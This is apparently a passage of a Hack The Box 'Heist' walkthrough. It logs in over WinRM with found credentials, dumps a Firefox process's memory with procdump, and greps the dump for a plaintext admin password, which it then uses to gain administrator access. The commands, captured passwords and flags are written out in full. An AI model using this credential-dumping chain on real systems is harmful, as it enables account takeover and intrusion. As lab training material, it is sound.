# Enumeration -

Since we got one successful pair of credential we gonna use it to login via Win-rm -

```bash
root@napster:/opt/winrm-brute# evil-winrm -u Chase -p 'Q4)sJu\Y8qz*A3?d' -i 10.10.10.149

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Chase\Documents> whoami
supportdesk\chase
*Evil-WinRM* PS C:\Users\Chase\Desktop> type user.txt
a127daef77ab6d9d92008653295f59c4
```

There was a todo list -

```bash
*Evil-WinRM* PS C:\Users\Chase\Desktop> dir


    Directory: C:\Users\Chase\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/22/2019   9:08 AM            121 todo.txt
-a----        4/22/2019   9:07 AM             32 user.txt


*Evil-WinRM* PS C:\Users\Chase\Desktop> type todo.txt
Stuff to-do:
1. Keep checking the issues list.
2. Fix the router config.

Done:
1. Restricted access for guest user.
```

How would chase check the issues list? With a browser.

We can also see multiple instances of firefox running -

```bash
*Evil-WinRM* PS C:\Users\Chase\Desktop> get-process firefox

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
   1079      80   215064     568288       8.81   6176   1 firefox
    347      20    10052      34888       0.09   6284   1 firefox
    401      36    51704     111444       1.16   6416   1 firefox
    378      30    37508      74252       1.38   6680   1 firefox
    355      25    16440      39064       0.11   6964   1 firefox
```

### Getting creds from Firefox -

We gonna download -

[Procdump64.exe](https://live.sysinternals.com/)

Upload it to Heist using evilwinrm -

```bash
*Evil-WinRM* PS C:\Users\Chase\Desktop> upload procdump64.exe
Info: Uploading procdump64.exe to C:\Users\Chase\Desktop\procdump64.exe

                                                             
Data: 513184 bytes of 513184 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\Users\Chase\Desktop> dir


    Directory: C:\Users\Chase\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        7/17/2021   9:59 PM         384888 procdump64.exe
-a----        4/22/2019   9:08 AM            121 todo.txt
-a----        4/22/2019   9:07 AM             32 user.txt
```

Nor run it with any of the found firefox PID -

```bash
*Evil-WinRM* PS C:\Users\Chase\Desktop> .\procdump64 -ma 6176 -accepteula
*Evil-WinRM* PS C:\Users\Chase\Desktop> ls


    Directory: C:\Users\Chase\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        7/17/2021  10:03 PM      584374451 accepteula.dmp
-a----        7/17/2021   9:59 PM         384888 procdump64.exe
-a----        4/22/2019   9:08 AM            121 todo.txt
-a----        4/22/2019   9:07 AM             32 user.txt


*Evil-WinRM* PS C:\Users\Chase\Desktop> cat accepteula.dmp | Select-String -Pattern password                                                                  
                                                                                                                                                              
C:\Windows\System32\KERNELBASE.dll¡ ï¾.UsersP1Chase<                                                                                                        5]
ï¾.Chase\1DownloadsD    ï¾.Downloads]M                                                                                                                        
¡                                                                                                                                                            ]
    DriverData=C:\Windows\System32\Drivers\DriverData                                                                                                         
                                                     ¡‘dW uâ]M Oâ]Maâ]M                                                                                       
                                                                       ¡                                                                                    5]
                                                                                                              fW"C:\Program                                   
Files\Mozilla Firefox\firefox.exe" localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=O¡
```

We found -

user - admin
pass - 4dD!5}x/re8]FBuZ


# Administrator -

Login via the found creds using evil winrm -

```bash
root@napster:~/Documents/HTB/Heist# evil-winrm -u administrator -p '4dD!5}x/re8]FBuZ' -i 10.10.10.149

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>whoami
supportdesk\administrator
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/22/2019   9:05 AM             32 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
50dfa3c6bfd20e2e0d071b073d766897
```